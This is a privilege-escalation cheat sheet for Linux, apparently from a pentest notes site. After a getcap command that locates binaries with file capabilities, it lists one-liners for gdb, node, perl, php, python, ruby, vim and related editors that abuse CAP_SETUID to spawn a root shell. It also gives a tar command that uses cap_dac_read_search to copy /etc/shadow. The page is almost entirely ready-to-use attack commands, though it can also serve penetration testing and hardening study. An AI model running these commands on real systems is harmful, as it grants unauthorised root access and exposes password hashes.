# File Capabilities

Find binaries with capabilities

```bash
getcap -r / 2>/dev/null
```

|         | Capability                | Command                                                                                         |
| ------- | ------------------------- | ----------------------------------------------------------------------------------------------- |
| gdb     | CAP\_SETUID               | `./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit`                             |
| node    | CAP\_SETUID               | `./node -e 'process.setuid(0); child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'`             |
| perl    | CAP\_SETUID               | `./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`                           |
| php #1  | CAP\_SETUID               | `CMD="/bin/sh"`                                                                                 |
| php #2  | CAP\_SETUID               | `./php -r "posix_setuid(0); system('$CMD');"`                                                   |
| python  | CAP\_SETUID               | `./python -c 'import os; os.setuid(0); os.system("/bin/sh")'`                                   |
| ruby    | CAP\_SETUID               | `./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'`                                            |
| rview   | CAP\_SETUID               | `./rview -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`   |
| rvim    | CAP\_SETUID               | `./rvim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`    |
| tar     | cap\_dac\_read\_search+ep | `tar -cvf shadow.tar /etc/shadow; tar -xvf shadow.tar`                                          |
| view    | CAP\_SETUID               | `./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`    |
| vim     | CAP\_SETUID               | `./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`     |
| vimdiff | CAP\_SETUID               | `./vimdiff -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'` |

{% embed url="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/" %}
